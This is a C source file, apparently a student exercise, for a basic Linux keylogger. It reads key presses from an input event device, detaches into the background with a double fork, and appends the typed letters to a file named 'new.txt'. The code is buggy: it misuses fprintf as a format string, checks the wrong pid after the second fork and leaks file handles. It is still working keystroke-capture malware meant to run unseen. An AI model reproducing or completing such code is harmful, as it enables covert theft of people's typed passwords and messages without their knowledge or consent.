#include <assert.h>
#include <fcntl.h>
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>


void writing(FILE *sd, char *w){
  fprintf(sd, w);
  fclose(sd);
}

void daemonisasi(){
  pid_t pid = fork();
  assert(pid != -1);
  if (pid > 0){
    exit(EXIT_SUCCESS);
  }
  setsid();
  pid_t newpid = fork();
  assert(newpid != -1);
  if (pid > 0){
    exit(EXIT_SUCCESS);
  }
}

int main(int argc, char *argv[]){
  char *event = argv[1];

  int fd = open(argv[1], O_RDONLY, 0);
  struct input_event ie;

  daemonisasi();
  while (1){
    FILE *fp ;
    fp = fopen("new.txt", "a");
    read(fd, &ie,sizeof(ie));

    if (ie.type != EV_KEY){
      continue;
    }

    if (ie.value != 1 ){
      continue;
    }

    //i need to convert the integer ie.code variable into string
    if (ie.code > 1 && ie.code < 11){
      printf("the key num that is being pressed is %d\n", ie.code - 1 );
      continue;
    }

    else if(ie.code == 11 ){
      writing(fp, "0");
      continue;
    }
    
    switch(ie.code){
      case KEY_A:
        writing(fp, "A");
        break;
      case KEY_B:
        writing(fp, "B");
        break;
      case KEY_C:
        writing(fp, "C");
        break;
      case KEY_D:
        writing(fp, "D");
        break;
      case KEY_E:
        writing(fp, "E");
        break;
      case KEY_F:
        writing(fp, "F");
        break;
      case KEY_G:
        writing(fp, "G");
        break;
      case KEY_H:
        writing(fp, "H");
        break;
      case KEY_I:
        writing(fp, "I");
        break;
      case KEY_J:
        writing(fp, "J");
        break;
      case KEY_K:
        writing(fp, "K");
        break;
      case KEY_L:
        writing(fp, "L");
        break;
      case KEY_M:
        writing(fp, "M");
        break;
      case KEY_N:
        writing(fp, "N");
        break;
      case KEY_O:
        writing(fp, "O");
        break;
      case KEY_P:
        writing(fp, "P");
        break;
      case KEY_Q:
        writing(fp, "Q");
        break;
      case KEY_R :
        writing(fp, "R");
        break;
      case KEY_S :
        writing(fp, "S");
        break;
      case KEY_T :
        writing(fp, "T");
        break;
      case KEY_U :
        writing(fp, "U");
        break;
      case KEY_V :
        writing(fp, "V");
        break;
      case KEY_W :
        writing(fp, "W");
        break;
      case KEY_X :
        writing(fp, "X");
        break;
      case KEY_Y :
        writing(fp, "Y");
        break;
      case KEY_Z:
        writing(fp, "Z");
        break;
      default:
        printf("UNKNOWN");
    }

  }
}
